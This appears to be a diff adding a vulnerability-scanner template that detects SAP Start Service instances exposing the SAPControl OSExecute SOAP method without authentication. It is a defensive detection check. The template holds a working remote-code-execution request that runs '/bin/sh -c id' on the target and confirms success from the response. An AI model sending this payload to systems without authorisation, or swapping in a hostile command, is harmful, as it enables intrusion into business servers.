@@ -1,0 +1,45 @@
+id: sap-osexecute-rce
+brief:
+    title: SAPControl OSExecute - Remote Code Execution (RCE)
+    by: LRVT
+    level: critical
+    about: Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP interface exposes the OSExecute web method without authentication.
+    label:
+        - misconfig
+        - sap
+        - sapcontrol
+        - soap
+        - rce
+        - osexecute
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: text/xml; charset=UTF-8
+        SOAPAction: '''""'''
+      body: |-
+        <?xml version="1.0" encoding="utf-8"?>
+        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
+          <SOAP-ENV:Header>
+            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
+              <enableSession>true</enableSession>
+            </sapsess:Session>
+          </SOAP-ENV:Header>
+          <SOAP-ENV:Body>
+            <ns1:OSExecute xmlns:ns1="urn:SAPControl">
+              <command>/bin/sh -c id</command>
+              <async>0</async>
+            </ns1:OSExecute>
+          </SOAP-ENV:Body>
+        </SOAP-ENV:Envelope>
+      signs:
+        - "on": word
+          has:
+            - OSExecuteResponse
+            - <output>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
